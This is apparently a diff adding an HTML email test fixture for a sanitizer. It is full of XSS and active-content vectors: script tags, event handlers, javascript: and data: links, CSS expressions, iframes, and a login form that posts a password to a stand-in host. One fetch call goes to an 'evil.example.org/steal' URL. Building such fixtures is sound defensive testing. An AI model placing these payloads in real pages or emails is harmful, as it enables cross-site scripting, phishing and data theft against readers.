@@ -1,0 +1,34 @@
+From: Ann Sender <ann@example.com>
+To: Bob Reader <bob@example.org>
+Subject: Active content
+Date: Tue, 24 Nov 2026 10:00:00 +0000
+Message-ID: <fixture@example.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html><html><head>
+<meta http-equiv="refresh" content="0; url=https://evil.example.org/">
+<base href="https://evil.example.org/">
+<link rel="stylesheet" href="https://evil.example.org/x.css">
+<style>@import url(https://evil.example.org/i.css); body { background: url(https://evil.example.org/bg.png) } .m:after { content: "XSS-MARKER" }</style>
+<script>document.write("XSS-MARKER"); fetch("https://evil.example.org/steal")</script>
+<title>XSS-MARKER</title>
+</head><body onload="alert('XSS-MARKER')">
+<p onclick="alert(1)" style="color: red; background-image: url('https://evil.example.org/p.png'); width: expression(alert(1))">Visible text</p>
+<a href="javascript:alert('XSS-MARKER')">click me</a>
+<a href="  JaVaScRiPt:alert(1)">spaced</a>
+<a href="vbscript:msgbox(1)">vb</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data link</a>
+<iframe src="https://evil.example.org/frame">XSS-MARKER</iframe>
+<object data="https://evil.example.org/o.swf">XSS-MARKER</object>
+<embed src="https://evil.example.org/e.swf">
+<form action="https://evil.example.org/login" method="post"><input name="password" value="XSS-MARKER"><button>Sign in</button></form>
+<img src="x" onerror="alert('XSS-MARKER')">
+<svg><script>alert('XSS-MARKER')</script><a xlink:href="javascript:alert(1)"><text>XSS-MARKER</text></a></svg>
+<math><mi>XSS-MARKER</mi></math>
+<template><p>XSS-MARKER</p></template>
+<noscript><p>XSS-MARKER</p></noscript>
+<div style="display:none">HIDDEN-MARKER</div>
+<p style="font-family: 'a&quot;;}&lt;/style&gt;'">Styled</p>
+<a href="https://www.example.com/ok" onmouseover="alert(1)">a real link</a>
+</body></html>
